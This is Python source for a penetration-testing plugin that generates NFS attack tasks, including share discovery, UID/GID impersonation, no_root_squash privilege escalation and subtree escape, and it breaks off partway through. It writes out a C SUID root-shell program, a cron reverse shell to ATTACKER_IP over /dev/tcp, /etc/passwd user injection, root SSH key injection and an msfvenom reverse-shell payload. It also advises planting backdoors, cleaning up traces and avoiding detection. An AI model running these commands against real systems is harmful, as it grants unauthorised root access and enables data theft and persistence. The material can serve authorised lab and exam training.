"""
NFS service enumeration plugin

Generates tasks for Network File System (NFS) enumeration including:
- Share discovery and permission analysis
- Version detection and vulnerability scanning
- Mount and access testing
- UID/GID impersonation techniques
- no_root_squash privilege escalation paths
- Subtree escape testing

Extracted from HackTricks: nfs-service-pentesting.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry
from .sql_mixin import SQLPluginMixinV2


@ServiceRegistry.register
class NFSPlugin(ServicePlugin, SQLPluginMixinV2):
    """NFS enumeration plugin with SQL backend support"""

    @property
    def name(self) -> str:
        return "nfs"

    @property
    def default_ports(self) -> List[int]:
        return [2049]

    @property
    def service_names(self) -> List[str]:
        return ['nfs', 'nfs_acl', 'nfs3', 'nfs4', 'rpcbind']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect NFS services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common ports
        if port in self.default_ports:
            return True

        # Check RPC service detection
        if 'nfs' in service or 'rpc' in service:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate NFS enumeration task tree.

        Tries SQL backend first, falls back to hardcoded tasks if unavailable.
        """
        # Try SQL mode
        try:
            return self.get_task_tree_from_sql(target, port, service_info)
        except Exception as e:
            # Fallback to hardcoded (for backwards compatibility)
            if hasattr(self, 'debug_logger'):
                self.debug_logger.log_warning(
                    "NFS_PLUGIN",
                    f"SQL backend unavailable, using hardcoded tasks: {e}"
                )
            return self._get_hardcoded_task_tree(target, port, service_info)

    def _get_hardcoded_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Original hardcoded task tree (fallback mode).

        RENAMED from get_task_tree() to preserve original logic.
        """
        version = service_info.get('version', '')
        product = service_info.get('product', '')

        tasks = {
            'id': f'nfs-enum-{port}',
            'name': f'NFS Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: RPC Service Discovery
        tasks['children'].append({
            'id': f'rpc-info-{port}',
            'name': 'RPC Service Information',
            'type': 'command',
            'metadata': {
                'command': f'rpcinfo -p {target}',
                'description': 'Query RPC portmapper to discover NFS-related services and ports',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    '-p': 'Probe RPC portmapper on target and display all registered programs'
                },
                'success_indicators': [
                    'List of RPC services displayed (mountd, nfs, nlockmgr)',
                    'Port numbers for NFS services revealed',
                    'NFS version information visible (2, 3, or 4)'
                ],
                'failure_indicators': [
                    'Connection refused (port 111/tcp closed)',
                    'No response (filtered or service disabled)',
                    'rpcinfo: RPC: Program not registered'
                ],
                'next_steps': [
                    'Note all NFS-related port numbers for enumeration',
                    'Identify NFS version from RPC program numbers',
                    'Proceed with showmount if NFSv3 detected'
                ],
                'alternatives': [
                    f'nmap -sV -p 111,{port} --script=rpcinfo {target}',
                    f'rpcinfo -s {target} (short format)',
                    'Manual: nc -nv {target} 111 (raw RPC connection)'
                ],
                'notes': 'RPC portmapper (port 111) must be open. NFSv4 may not require portmapper.',
                'time_estimate': '5 seconds'
            }
        })

        # TASK 2: Share Discovery (showmount)
        tasks['children'].append({
            'id': f'showmount-{port}',
            'name': 'NFS Share Discovery',
            'type': 'command',
            'metadata': {
                'command': f'showmount -e {target}',
                'description': 'List all NFS exports and their access controls (NFSv3)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                'flag_explanations': {
                    '-e': 'Show export list (directories available for mounting)',
                    'target': 'NFS server hostname or IP address'
                },
                'success_indicators': [
                    'Export list displayed with paths (e.g., /home, /var)',
                    'Access controls visible (everyone, specific IPs, hostnames)',
                    'Multiple exports discovered (increases attack surface)'
                ],
                'failure_indicators': [
                    'clnt_create: RPC: Program not registered (NFSv4 or disabled)',
                    'Export list is empty (no shares exported)',
                    'Permission denied (IP-based restrictions)'
                ],
                'next_steps': [
                    'Mount each discovered export for enumeration',
                    'Note exports allowing "everyone" access (highest priority)',
                    'If showmount fails, try NFSv4 direct mount approach'
                ],
                'alternatives': [
                    f'nmap -p {port} --script nfs-showmount {target}',
                    f'rpcinfo -p {target} | grep mount',
                    f'msfconsole -x "use auxiliary/scanner/nfs/nfsmount; set RHOSTS {target}; run; exit"'
                ],
                'notes': 'showmount only works with NFSv3. NFSv4 requires direct mount attempts. May be disabled even if NFS is running.',
                'time_estimate': '5-10 seconds'
            }
        })

        # TASK 3: Nmap NSE Scripts
        nmap_scripts_task = {
            'id': f'nmap-nfs-scripts-{port}',
            'name': 'Nmap NFS Enumeration Scripts',
            'type': 'parent',
            'children': [
                {
                    'id': f'nfs-ls-{port}',
                    'name': 'NFS Directory Listing',
                    'type': 'command',
                    'metadata': {
                        'command': f'nmap -p {port} --script nfs-ls {target}',
                        'description': 'List NFS exports and enumerate directory contents remotely',
                        'tags': ['OSCP:HIGH', 'ENUM', 'AUTOMATED'],
                        'flag_explanations': {
                            '-p {port}': f'Target NFS port {port}',
                            '--script nfs-ls': 'NSE script to list NFS exports and directory contents',
                            'target': 'Target IP/hostname'
                        },
                        'success_indicators': [
                            'Directory structure displayed with permissions',
                            'File/folder names enumerated',
                            'Ownership (UID/GID) visible for files'
                        ],
                        'failure_indicators': [
                            'Access denied (IP restrictions)',
                            'No exports found',
                            'Script timeout (firewall or filtering)'
                        ],
                        'next_steps': [
                            'Note all UIDs/GIDs encountered (for impersonation)',
                            'Identify interesting files (config, backup, credentials)',
                            'Check for world-writable directories'
                        ],
                        'alternatives': [
                            f'showmount -e {target} && mount -t nfs {target}:/export /mnt/nfs && ls -la /mnt/nfs',
                            f'nfs_analyze {target} (advanced tool from nfs-security-tooling)'
                        ],
                        'notes': 'Requires successful export discovery. May reveal sensitive file paths without mounting.',
                        'time_estimate': '30-60 seconds'
                    }
                },
                {
                    'id': f'nfs-showmount-{port}',
                    'name': 'NFS Showmount (Nmap)',
                    'type': 'command',
                    'metadata': {
                        'command': f'nmap -p {port} --script nfs-showmount {target}',
                        'description': 'NSE alternative to showmount command for export discovery',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'AUTOMATED'],
                        'flag_explanations': {
                            '--script nfs-showmount': 'Emulates showmount -e functionality via Nmap'
                        },
                        'success_indicators': [
                            'Exports listed with mount points',
                            'Access controls displayed'
                        ],
                        'failure_indicators': [
                            'No exports found',
                            'RPC timeout'
                        ],
                        'next_steps': [
                            'Proceed with mounting discovered exports',
                            'Prioritize exports with broad access controls'
                        ],
                        'alternatives': [
                            f'showmount -e {target}',
                            f'rpcinfo -p {target} | grep mountd'
                        ],
                        'notes': 'Same functionality as showmount -e but through Nmap. Use if showmount not available.',
                        'time_estimate': '10-15 seconds'
                    }
                },
                {
                    'id': f'nfs-statfs-{port}',
                    'name': 'NFS Filesystem Statistics',
                    'type': 'command',
                    'metadata': {
                        'command': f'nmap -p {port} --script nfs-statfs {target}',
                        'description': 'Gather NFS filesystem statistics (disk space, free space, block size)',
                        'tags': ['OSCP:LOW', 'ENUM', 'AUTOMATED'],
                        'flag_explanations': {
                            '--script nfs-statfs': 'Retrieve filesystem statistics from NFS shares'
                        },
                        'success_indicators': [
                            'Disk space information displayed',
                            'Available space shown',
                            'Block size and inode counts visible'
                        ],
                        'failure_indicators': [
                            'Access denied',
                            'Script timeout'
                        ],
                        'next_steps': [
                            'Identify shares with significant free space (potential upload targets)',
                            'Note block sizes for transfer optimization'
                        ],
                        'alternatives': [
                            'mount -t nfs {target}:/export /mnt && df -h /mnt',
                            'Manual: After mounting, run df -h'
                        ],
                        'notes': 'Low priority for OSCP. Useful for data exfiltration planning or identifying storage capacity.',
                        'time_estimate': '10-15 seconds'
                    }
                }
            ]
        }
        tasks['children'].append(nmap_scripts_task)

        # TASK 4: Advanced Enumeration with nfs_analyze
        tasks['children'].append({
            'id': f'nfs-analyze-{port}',
            'name': 'Advanced NFS Security Analysis',
            'type': 'command',
            'metadata': {
                'command': f'# Install: git clone https://github.com/hvs-consulting/nfs-security-tooling.git\n# Then: python3 nfs_analyze.py {target}',
                'description': 'Comprehensive NFS security analysis including no_root_squash detection, export escape testing, and connected client enumeration',
                'tags': ['OSCP:MEDIUM', 'ENUM', 'RESEARCH'],
                'flag_explanations': {
                    'target': 'NFS server IP address'
                },
                'success_indicators': [
                    'Detailed export configuration displayed',
                    'Squashing settings identified (no_root_squash = critical)',
                    'Filesystem boundaries detected (potential for export escape)',
                    'Connected client IPs listed'
                ],
                'failure_indicators': [
                    'Tool not installed',
                    'Access denied to enumeration',
                    'NFSv4 incompatibility'
                ],
                'next_steps': [
                    'If no_root_squash found: Proceed to privilege escalation attack',
                    'If export escape possible: Test accessing files outside export boundaries',
                    'Document squashing configuration for exploitation planning'
                ],
                'alternatives': [
                    'Manual: Mount share and test UID 0 access',
                    'Check /etc/exports on target if you gain shell access',
                    'Use showmount -a {target} to list connected clients'
                ],
                'notes': 'Tool from https://github.com/hvs-consulting/nfs-security-tooling. Supports ext4, xfs, btrfs filesystems. Critical for identifying no_root_squash misconfigurations.',
                'time_estimate': '60-90 seconds'
            }
        })

        # TASK 5: Metasploit NFS Scanner
        tasks['children'].append({
            'id': f'msf-nfsmount-{port}',
            'name': 'Metasploit NFS Mount Scanner',
            'type': 'command',
            'metadata': {
                'command': f'msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; set RHOSTS {target}; set RPORT {port}; run; exit"',
                'description': 'Scan and enumerate NFS mounts with permission analysis using Metasploit',
                'tags': ['OSCP:MEDIUM', 'ENUM', 'AUTOMATED'],
                'flag_explanations': {
                    '-q': 'Quiet mode (suppress banner)',
                    '-x': 'Execute commands and exit',
                    'use auxiliary/scanner/nfs/nfsmount': 'Load NFS mount scanner module',
                    'set RHOSTS': 'Set target IP address',
                    'set RPORT': 'Set NFS port (usually 2049)',
                    'run': 'Execute scanner',
                    'exit': 'Quit msfconsole after completion'
                },
                'success_indicators': [
                    'Exports discovered and listed',
                    'Permissions displayed (READ, WRITE, ALL)',
                    'Export paths and access controls enumerated'
                ],
                'failure_indicators': [
                    'No exports found',
                    'Connection refused',
                    'RPC error (version incompatibility)'
                ],
                'next_steps': [
                    'Mount writable shares for exploitation',
                    'Test UID/GID impersonation on restricted shares',
                    'Proceed with manual mounting based on findings'
                ],
                'alternatives': [
                    f'showmount -e {target}',
                    f'nmap --script nfs-showmount {target}'
                ],
                'notes': 'Metasploit alternative to showmount. Useful if standard tools unavailable or for consistent output format.',
                'time_estimate': '20-30 seconds'
            }
        })

        # TASK 6: Mount Testing
        mount_task = {
            'id': f'nfs-mount-test-{port}',
            'name': 'NFS Mount and Access Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'mount-nfsv2-{port}',
                    'name': 'Mount Share (NFSv2 - No Auth)',
                    'type': 'manual',
                    'metadata': {
                        'command': f'mkdir -p /mnt/nfs_{target.replace(".", "_")}\nmount -t nfs -o vers=2,nolock {target}:/EXPORT_PATH /mnt/nfs_{target.replace(".", "_")}',
                        'description': 'Mount NFS export using version 2 (no authentication) for maximum access',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'CRITICAL'],
                        'flag_explanations': {
                            '-t nfs': 'Filesystem type is NFS',
                            '-o vers=2': 'Force NFSv2 (no authentication or authorization)',
                            '-o nolock': 'Disable file locking (avoids lock manager issues)',
                            'target:/EXPORT_PATH': 'Remote server and export path from showmount output',
                            '/mnt/nfs_*': 'Local mount point (must exist)'
                        },
                        'success_indicators': [
                            'Mount succeeds without errors',
                            'ls command shows remote directory contents',
                            'Files accessible for reading'
                        ],
                        'failure_indicators': [
                            'mount.nfs: access denied (IP restrictions)',
                            'mount.nfs: Protocol not supported (NFSv2 disabled)',
                            'mount.nfs: No such file or directory (invalid export path)'
                        ],
                        'next_steps': [
                            'Enumerate all files: find /mnt/nfs_* -ls',
                            'Check file ownership: ls -la /mnt/nfs_* (note UIDs/GIDs)',
                            'Search for sensitive files: grep -r "password\\|key\\|secret" /mnt/nfs_*',
                            'Test write access: touch /mnt/nfs_*/testfile',
                            'If write access: Proceed to privilege escalation techniques'
                        ],
                        'alternatives': [
                            f'mount -t nfs -o vers=3,nolock {target}:/EXPORT_PATH /mnt/nfs (try NFSv3)',
                            f'mount -t nfs {target}:/EXPORT_PATH /mnt/nfs (default version)',
                            'nfsshell (interactive NFS client from https://github.com/NetDirect/nfsshell)'
                        ],
                        'notes': 'NFSv2 bypasses most authentication. Replace EXPORT_PATH with actual export from showmount. Create mount point first: mkdir -p /mnt/nfs_*. Always unmount when done: umount /mnt/nfs_*',
                        'time_estimate': '10-15 seconds'
                    }
                },
                {
                    'id': f'enumerate-mounted-{port}',
                    'name': 'Enumerate Mounted NFS Share',
                    'type': 'manual',
                    'metadata': {
                        'command': f'# List all files with ownership\nfind /mnt/nfs_{target.replace(".", "_")} -ls 2>/dev/null\n\n# Search for sensitive files\ngrep -r "password\\|secret\\|key\\|token\\|credential" /mnt/nfs_{target.replace(".", "_")} 2>/dev/null\n\n# Find world-writable directories\nfind /mnt/nfs_{target.replace(".", "_")} -type d -perm -o+w 2>/dev/null',
                        'description': 'Systematically enumerate mounted NFS share for sensitive data and exploitation opportunities',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                        'flag_explanations': {
                            'find -ls': 'Long listing format showing permissions, ownership, size, timestamps',
                            '-r': 'Recursive grep through all files',
                            '-type d': 'Only find directories',
                            '-perm -o+w': 'World-writable permissions (anyone can write)',
                            '2>/dev/null': 'Suppress permission denied errors'
                        },
                        'success_indicators': [
                            'File listing generated with UIDs/GIDs',
                            'Sensitive keywords found in files',
                            'World-writable directories discovered',
                            'SSH keys, config files, or credentials found'
                        ],
                        'failure_indicators': [
                            'All files return permission denied (restrictive UIDs)',
                            'No sensitive data found',
                            'Empty export (no files)'
                        ],
                        'next_steps': [
                            'Note all UIDs/GIDs for impersonation strategy',
                            'Download sensitive files for offline analysis',
                            'If world-writable dirs found: Upload malicious files',
                            'Check for user home directories (SSH keys, bash history)'
                        ],
                        'alternatives': [
                            'Manual browsing: cd /mnt/nfs_* && ls -laR',
                            'Tree view: tree -pug /mnt/nfs_* (shows permissions, user, group)',
                            'File types: file /mnt/nfs_*/* (identify file types)'
                        ],
                        'notes': 'Focus on: /home/* (user files), .ssh/id_rsa (SSH keys), .bash_history (command history), config files, backup files. Document all UIDs you cannot access for later impersonation.',
                        'time_estimate': '2-5 minutes depending on share size'
                    }
                },
                {
                    'id': f'test-write-access-{port}',
                    'name': 'Test Write Access',
                    'type': 'manual',
                    'metadata': {
                        'command': f'# Test write in root of mount\ntouch /mnt/nfs_{target.replace(".", "_")}/test_write_access 2>/dev/null && echo "Write successful!" || echo "Write denied"\n\n# Test in subdirectories\nfind /mnt/nfs_{target.replace(".", "_")} -type d -exec sh -c \'touch "$1"/test_write 2>/dev/null && echo "Writable: $1"\' _ {{}} \\;',
                        'description': 'Test write permissions across NFS share to identify upload opportunities',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'flag_explanations': {
                            'touch': 'Create empty file (tests write permission)',
                            '2>/dev/null': 'Suppress error messages',
                            '&&': 'Execute second command only if first succeeds',
                            '||': 'Execute second command only if first fails',
                            '-exec sh -c': 'Execute shell command for each found directory'
                        },
                        'success_indicators': [
                            '"Write successful!" message',
                            'test_write_access file created',
                            'Writable directories listed'
                        ],
                        'failure_indicators': [
                            '"Write denied" message',
                            'Permission denied errors',
                            'No writable directories found'
                        ],
                        'next_steps': [
                            'If writable with your UID: Upload shells, backdoors, persistence',
                            'If no write access: Proceed with UID/GID impersonation',
                            'Check for web roots (if web server present): /var/www, /srv/www',
                            'Clean up test files: rm /mnt/nfs_*/test_write*'
                        ],
                        'alternatives': [
                            'Manual: cd /mnt/nfs_* && touch testfile',
                            'Verbose: echo "test" > /mnt/nfs_*/writeable/test.txt'
                        ],
                        'notes': 'Write access opens multiple exploitation paths: webshells, cron jobs, SSH keys, SUID binaries (if no_root_squash). Clean up test files to avoid detection.',
                        'time_estimate': '1-2 minutes'
                    }
                }
            ]
        }
        tasks['children'].append(mount_task)

        # TASK 7: UID/GID Impersonation
        impersonation_task = {
            'id': f'uid-gid-impersonation-{port}',
            'name': 'UID/GID Impersonation Attack',
            'type': 'parent',
            'children': [
                {
                    'id': f'create-local-user-{port}',
                    'name': 'Create Local User with Target UID',
                    'type': 'manual',
                    'metadata': {
                        'command': '# Identify target UID from NFS share\nls -ln /mnt/nfs_* | grep <target_file>\n\n# Create local user with matching UID\nsudo useradd -u <TARGET_UID> nfsuser\nsudo usermod -a -G <TARGET_GID> nfsuser\n\n# Switch to new user and access files\nsudo su - nfsuser\ncd /mnt/nfs_*\nls -la  # Now see files owned by this UID',
                        'description': 'Create local user matching target UID/GID to bypass NFS access controls',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'CRITICAL'],
                        'flag_explanations': {
                            'ls -ln': 'List files with numeric UIDs/GIDs (not username)',
                            'useradd -u': 'Create user with specific UID',
                            'usermod -a -G': 'Add user to additional group (for GID matching)',
                            'su -': 'Switch user with login environment'
                        },
                        'success_indicators': [
                            'User created with target UID',
                            'Files now readable/writable when accessed as nfsuser',
                            'Permission denied errors resolved'
                        ],
                        'failure_indicators': [
                            'UID already exists (pick unused UID)',
                            'Still permission denied (may need multiple GIDs)',
                            'Cannot create users (need root on attacker machine)'
                        ],
                        'next_steps': [
                            'Access previously restricted files',
                            'Upload malicious content (shells, SUID binaries)',
                            'Modify existing files if writable',
                            'Repeat process for multiple UIDs if needed'
                        ],
                        'alternatives': [
                            'Edit /etc/passwd directly (change existing user UID)',
                            'Use fuse_nfs tool (automatically sends correct UIDs)',
                            'Docker container with custom UID: docker run -u <UID>:<GID> -v /mnt/nfs:/mnt alpine sh'
                        ],
                        'notes': 'NFS trusts client-provided UIDs by default. Root UID (0) is squashed to nobody unless no_root_squash is set. This technique works for all non-root UIDs. Multiple UIDs may be needed for different files.',
                        'time_estimate': '5-10 minutes'
                    }
                },
                {
                    'id': f'fuse-nfs-tool-{port}',
                    'name': 'Automated UID/GID Spoofing with fuse_nfs',
                    'type': 'command',
                    'metadata': {
                        'command': f'# Install: git clone https://github.com/hvs-consulting/nfs-security-tooling.git\n# Mount with auto UID spoofing\nfuse_nfs nfs://{target}/EXPORT_PATH /mnt/nfs_fuse',
                        'description': 'Use fuse_nfs to automatically send appropriate UIDs/GIDs for accessing files',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'EXPLOIT'],
                        'flag_explanations': {
                            'fuse_nfs': 'FUSE-based NFS client with UID spoofing',
                            'nfs://target/path': 'NFS URL format',
                            '/mnt/nfs_fuse': 'Local mount point'
                        },
                        'success_indicators': [
                            'Mount succeeds',
                            'All files accessible regardless of UID',
                            'No permission denied errors'
                        ],
                        'failure_indicators': [
                            'Tool not installed',
                            'Mount fails (connection issues)',
                            'Still restricted (may need manual configuration)'
                        ],
                        'next_steps': [
                            'Browse all files freely',
                            'Upload malicious content',
                            'Extract sensitive data'
                        ],
                        'alternatives': [
                            'Manual UID impersonation (create local users)',
                            'NFSShell tool (interactive with UID control)',
                            'Standard mount with multiple local users'
                        ],
                        'notes': 'Tool from https://github.com/hvs-consulting/nfs-security-tooling. Simplifies UID impersonation by automatically using needed UIDs. May not work with all NFS versions.',
                        'time_estimate': '2-3 minutes'
                    }
                },
                {
                    'id': f'nfsshell-tool-{port}',
                    'name': 'Interactive NFS Client (NFSShell)',
                    'type': 'command',
                    'metadata': {
                        'command': f'# Install: git clone https://github.com/NetDirect/nfsshell.git && cd nfsshell && make\n# Interactive session\n./nfsshell {target}\nnfs> host {target}\nnfs> export\nnfs> mount /export_path\nnfs> uid <UID>\nnfs> gid <GID>\nnfs> ls\nnfs> get <filename>',
                        'description': 'Interactive NFS client with manual UID/GID control for targeted file access',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'flag_explanations': {
                            'host': 'Connect to NFS server',
                            'export': 'List available exports',
                            'mount': 'Mount specific export',
                            'uid <UID>': 'Set client UID for requests',
                            'gid <GID>': 'Set client GID for requests',
                            'ls': 'List directory contents',
                            'get': 'Download file',
                            'put': 'Upload file'
                        },
                        'success_indicators': [
                            'Connection established',
                            'Exports listed',
                            'Files accessible after setting UID/GID',
                            'Downloads/uploads successful'
                        ],
                        'failure_indicators': [
                            'Connection refused',
                            'Permission denied even with UID change',
                            'Tool not available'
                        ],
                        'next_steps': [
                            'Change UID to match file ownership',
                            'Download sensitive files (SSH keys, configs)',
                            'Upload webshells or backdoors if writable',
                            'Test multiple UID/GID combinations'
                        ],
                        'alternatives': [
                            'Standard mount with local user creation',
                            'fuse_nfs for automated approach',
                            'Manual UID spoofing via useradd'
                        ],
                        'notes': 'Tool from https://github.com/NetDirect/nfsshell. Excellent tutorial: https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/. Provides fine-grained control over UID/GID per operation.',
                        'time_estimate': '5-10 minutes for setup and usage'
                    }
                }
            ]
        }
        tasks['children'].append(impersonation_task)

        # TASK 8: Privilege Escalation (no_root_squash)
        privesc_task = {
            'id': f'no-root-squash-privesc-{port}',
            'name': 'Privilege Escalation via no_root_squash',
            'type': 'parent',
            'children': [
                {
                    'id': f'detect-no-root-squash-{port}',
                    'name': 'Detect no_root_squash Misconfiguration',
                    'type': 'manual',
                    'metadata': {
                        'command': f'# Test if root UID is allowed\nsudo touch /mnt/nfs_{target.replace(".", "_")}/root_test 2>/dev/null && sudo ls -l /mnt/nfs_{target.replace(".", "_")}/root_test\n\n# Check ownership (should be root:root if no_root_squash)\n# If owned by nobody/65534, root_squash is enabled (secure)',
                        'description': 'Test if NFS share allows root UID (0) access without squashing to nobody',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'CRITICAL'],
                        'flag_explanations': {
                            'sudo': 'Execute command as root (UID 0)',
                            'touch': 'Create empty file',
                            'ls -l': 'Long listing showing ownership',
                            '2>/dev/null': 'Suppress errors if permission denied'
                        },
                        'success_indicators': [
                            'File created successfully',
                            'File owned by root (UID 0), not nobody (UID 65534)',
                            'no_root_squash confirmed (CRITICAL VULNERABILITY)'
                        ],
                        'failure_indicators': [
                            'Permission denied (root_squash enabled - secure)',
                            'File owned by nobody/65534 (root squashed)',
                            'File owned by different UID (all_squash enabled)'
                        ],
                        'next_steps': [
                            'If no_root_squash detected: PROCEED TO SUID BINARY ATTACK',
                            'If root_squash enabled: Focus on non-root UID impersonation',
                            'Clean up test file: sudo rm /mnt/nfs_*/root_test'
                        ],
                        'alternatives': [
                            'nfs_analyze tool (automates detection)',
                            'Check /etc/exports on target if shell access obtained',
                            'showmount -e may show export options in verbose output'
                        ],
                        'notes': 'no_root_squash is a CRITICAL misconfiguration allowing root-level exploitation. Default Linux configuration is root_squash (secure). This is a high-value OSCP target.',
                        'time_estimate': '30 seconds'
                    }
                },
                {
                    'id': f'suid-binary-upload-{port}',
                    'name': 'Upload SUID Binary for Root Access',
                    'type': 'manual',
                    'metadata': {
                        'command': f'# On attacker machine (Kali)\n# 1. Compile SUID shell\ncat <<\'EOF\' > shell.c\n#include <unistd.h>\n#include <stdlib.h>\nint main() {{\n    setuid(0);\n    setgid(0);\n    system("/bin/bash -p");\n    return 0;\n}}\nEOF\n\ngcc shell.c -o shell\n\n# 2. Copy to NFS share as root\nsudo cp shell /mnt/nfs_{target.replace(".", "_")}/shell\n\n# 3. Set SUID bit as root\nsudo chmod +xs /mnt/nfs_{target.replace(".", "_")}/shell\n\n# 4. On TARGET machine (via SSH or existing shell)\n# Execute SUID binary for instant root\n/nfs_mount_point/shell\n# Now root shell!',
                        'description': 'Exploit no_root_squash by uploading SUID root binary for privilege escalation',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'PRIVESC', 'CRITICAL'],
                        'flag_explanations': {
                            'setuid(0)': 'C function to set effective UID to root',
                            'setgid(0)': 'C function to set effective GID to root',
                            'system("/bin/bash -p")': 'Spawn bash shell preserving privileges (-p)',
                            'chmod +xs': 'Add SUID bit (+s) and execute permission (+x)',
                            'sudo': 'Execute as root on attacker machine (required for SUID)'
                        },
                        'success_indicators': [
                            'shell.c compiles without errors',
                            'Binary uploaded to NFS share',
                            'SUID bit set (shows as rws in ls -l)',
                            'Executing on target grants root shell (id shows uid=0)'
                        ],
                        'failure_indicators': [
                            'Permission denied during upload (no write access)',
                            'SUID bit not set (root_squash enabled)',
                            'Binary not executable on target (architecture mismatch)',
                            'nosuid mount option on target (SUID ignored)'
                        ],
                        'next_steps': [
                            'On target: Execute /path/to/shell for root access',
                            'Read /root/proof.txt or local.txt flag',
                            'Establish persistence (SSH keys, cron jobs)',
                            'Clean up binary: rm /nfs_mount/shell (anti-forensics)'
                        ],
                        'alternatives': [
                            'Upload /bin/bash copy: sudo cp /bin/bash /mnt/nfs/bash && sudo chmod +xs /mnt/nfs/bash',
                            'Use msfvenom payload: msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell',
                            'Python SUID script (if Python installed on target)',
                            'Copy existing SUID binary: sudo cp /bin/ping /mnt/nfs/ping && modify'
                        ],
                        'notes': 'THIS IS THE PRIMARY no_root_squash EXPLOITATION TECHNIQUE FOR OSCP. Requires: (1) no_root_squash enabled, (2) write access to share, (3) ability to execute files on target, (4) matching architecture (x64/x86). Check target arch: uname -m. Compile for target arch if needed.',
                        'time_estimate': '5-10 minutes'
                    }
                },
                {
                    'id': f'alternative-privesc-methods-{port}',
                    'name': 'Alternative no_root_squash Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'command': f'# Method 1: Inject SSH key\nsudo mkdir -p /mnt/nfs_{target.replace(".", "_")}/root/.ssh\nsudo cp ~/.ssh/id_rsa.pub /mnt/nfs_{target.replace(".", "_")}/root/.ssh/authorized_keys\nsudo chmod 600 /mnt/nfs_{target.replace(".", "_")}/root/.ssh/authorized_keys\nssh root@{target}  # Direct root login\n\n# Method 2: Modify /etc/passwd (if exported)\nsudo echo \'hacker:$6$salt$hashedpassword:0:0:root:/root:/bin/bash\' >> /mnt/nfs_{target.replace(".", "_")}/etc/passwd\nsu hacker  # On target\n\n# Method 3: Cron job for reverse shell\nsudo echo \'* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\' > /mnt/nfs_{target.replace(".", "_")}/etc/cron.d/reverse\nsudo chmod 644 /mnt/nfs_{target.replace(".", "_")}/etc/cron.d/reverse',
                        'description': 'Alternative privilege escalation methods exploiting no_root_squash',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'PRIVESC'],
                        'flag_explanations': {
                            'authorized_keys': 'SSH public key authentication file',
                            'chmod 600': 'Set restrictive permissions (owner read/write only)',
                            '/etc/passwd': 'User account database (may be exported)',
                            '/etc/cron.d/': 'Cron job directory (root-executed tasks)',
                            '$6$': 'SHA-512 password hash format'
                        },
                        'success_indicators': [
                            'SSH key login succeeds as root',
                            'New user in /etc/passwd allows su to root',
                            'Cron job executes and reverse shell received',
                            'Root access obtained via alternative method'
                        ],
                        'failure_indicators': [
                            'SSH rejects key (permissions or SSH config)',
                            '/etc not exported (cannot modify system files)',
                            'Cron job not executing (cron disabled or syntax error)',
                            'SELinux/AppArmor blocks execution'
                        ],
                        'next_steps': [
                            'If SSH key works: ssh root@target',
                            'If cron job works: nc -lvnp 4444 (wait for reverse shell)',
                            'If /etc/passwd modified: su to new root user',
                            'Establish multiple persistence mechanisms'
                        ],
                        'alternatives': [
                            'SUID binary upload (primary method)',
                            'Modify /etc/sudoers if exported',
                            'Replace system binaries (risky, easy to detect)',
                            'Modify .bashrc for existing root user'
                        ],
                        'notes': 'These methods depend on WHAT is exported. If /home is exported, SSH key injection works. If /etc is exported (rare but possible), system file modification works. SUID binary is most reliable as it only needs write access to ANY exported directory.',
                        'time_estimate': '5-15 minutes depending on method'
                    }
                }
            ]
        }
        tasks['children'].append(privesc_task)

        # TASK 9: Subtree Escape Attack
        tasks['children'].append({
            'id': f'subtree-escape-{port}',
            'name': 'Subtree Escape Attack',
            'type': 'manual',
            'metadata': {
                'command': f'# If /srv is exported but on same filesystem as /var\n# You may be able to access /var files through NFS\n\n# Use nfs_analyze tool or manual testing:\n# 1. Mount the export\nmount -t nfs {target}:/srv /mnt/nfs\n\n# 2. Try to access parent directories or sibling paths\n# (requires low-level NFS handle manipulation - use nfs_analyze)\n\n# 3. If successful, access files outside export:\n# Example: Access /var/log, /var/www, /etc/shadow (if group readable)',
                'description': 'Exploit disabled subtree_check to access filesystem outside export boundaries',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'RESEARCH'],
                'flag_explanations': {
                    'subtree_check': 'NFS security option verifying accessed files are within exported tree',
                    'disabled by default': 'Linux NFS servers disable subtree_check for performance'
                },
                'success_indicators': [
                    'nfs_analyze reports subtree escape possible',
                    'Files outside export path accessible',
                    'Access to /var/www (webshell upload), /var/log (log analysis), /etc files'
                ],
                'failure_indicators': [
                    'subtree_check enabled (secure)',
                    'Different filesystems (export on separate partition)',
                    'nfs_analyze tool unavailable or incompatible'
                ],
                'next_steps': [
                    'If /var/www accessible: Upload webshell',
                    'If /etc accessible: Read shadow file (if group readable)',
                    'If /var/log accessible: Analyze logs for credentials, paths',
                    'Map out full accessible filesystem'
                ],
                'alternatives': [
                    'Manual testing: Attempt path traversal through NFS handles',
                    'Target shell access: Check mount options (mount | grep nfs)',
                    'Check target /etc/exports for subtree_check setting'
                ],
